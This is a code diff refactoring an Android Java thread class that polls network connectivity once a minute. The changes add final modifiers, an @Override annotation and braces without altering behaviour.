@@ -24,33 +24,37 @@ public class BroadcastMonitorConnectivity extends Thread {
 	private static final String TAG = "BroadcastMonitorConnectivity";
 
 	private boolean stop;
-	private int period;
+	private final int period;
 
 	public BroadcastMonitorConnectivity() {
 		stop = false;
 		period = 60000; // Poll interval
 	}
 
+	@Override
 	synchronized public void run() {
 		do {
 			if (stop) {
 				return;
 			}
 
-			ConnectivityManager connectivityManager = (ConnectivityManager) Status.getAppContext().getSystemService(
-					Context.CONNECTIVITY_SERVICE);
+			final ConnectivityManager connectivityManager = (ConnectivityManager) Status.getAppContext()
+					.getSystemService(Context.CONNECTIVITY_SERVICE);
 
-			NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
+			final NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
 
-			if (activeNetworkInfo != null)
+			if (activeNetworkInfo != null) {
 				onReceive(activeNetworkInfo.isConnected());
-			else
+			} else {
 				onReceive(false);
-			
+			}
+
 			try {
 				wait(period);
-			} catch (InterruptedException e) {
-				if(Cfg.DEBUG) { Check.log(e); }
+			} catch (final InterruptedException e) {
+				if (Cfg.DEBUG) {
+					Check.log(e);
+				}
 			}
 		} while (true);
 	}
